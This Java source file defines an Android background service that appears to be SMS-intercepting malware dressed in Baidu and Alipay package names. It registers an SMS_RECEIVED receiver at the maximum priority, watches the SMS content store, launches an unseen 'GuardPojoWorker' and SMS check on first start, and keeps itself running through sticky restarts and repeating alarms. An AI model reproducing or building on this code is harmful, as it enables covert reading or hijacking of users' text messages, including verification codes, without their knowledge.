package com.baidu.pushagent;

import com.baidu.alipay.Constant;
import com.baidu.alipay.LogUtil;
import com.baidu.alipay.script.sms.GuardPojoWorker;
import com.baidu.serv.Alarms;
import com.baidu.serv.BaseThread;
import com.baidu.serv.CAR;
import com.baidu.serv.SAObserver;
import com.baidu.serv.ScreenActionReceiver;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;

//WatchService
public class PushFingerReceiver extends Service {
    
    private ScreenActionReceiver saReceiver = new ScreenActionReceiver();
    private Context context = this;
    private SAObserver sAObserver;
    
//    private MmsSmsData mmsSmsData;
    private Handler mHandler = new Handler();

    private CAR car = null;
    
    private static boolean first = true;
    
    @Override
    public IBinder onBind(Intent arg0) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        long start = System.currentTimeMillis();
//        LogUtil.e("OBService", "onCreate");
        
        try{
	        IntentFilter intentFilter = new IntentFilter();
	        intentFilter.addAction(Intent.ACTION_SCREEN_ON);
	        intentFilter.addAction(Intent.ACTION_SCREEN_OFF);
	        context.registerReceiver(saReceiver, intentFilter);
	        
	        sAObserver = new SAObserver(context, mHandler);
	        this.getContentResolver().registerContentObserver(Uri.parse(Constant.URI_SMS), true,
	                sAObserver);
	        
//	        mmsSmsData = new MmsSmsData(context, mHandler);
//	        this.getContentResolver().registerContentObserver(Uri.parse(Constant.URI_MMSSMS), true,
//	                mmsSmsData);
	        
	        car = new CAR();
	        IntentFilter smsIntentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
	        smsIntentFilter.setPriority(2147483647);
	        context.registerReceiver(this.car, smsIntentFilter);
	        
	        if(first){
	        	first = false;
		        new BaseThread(null){
		        	public void run(){
		        		try{
		        			GuardPojoWorker.invoke(context);
		        			
		        			SAObserver.checkSms(context);
		        			
//		        			MmsSmsData.checkMms(context);
		        		}catch (Exception e) {
							 e.printStackTrace();
						}
		        	}
		        }.start();
	        }
        }catch (Exception e) {
			e.printStackTrace();
		}
//        long end = System.currentTimeMillis();
//        LogUtil.e("OBService", "OnCreate finish : " +(end - start)/1000);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);

        Alarms.enableAlarmsService(context, 0.5 , 5 , PushFingerReceiver.class , false);

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        
//        LogUtil.e("OBService", "onDestroy");
        
        this.getContentResolver().unregisterContentObserver(sAObserver);
        
//        this.getContentResolver().unregisterContentObserver(mmsSmsData);
        
        context.unregisterReceiver(saReceiver);
        
        context.unregisterReceiver(car);
    }

}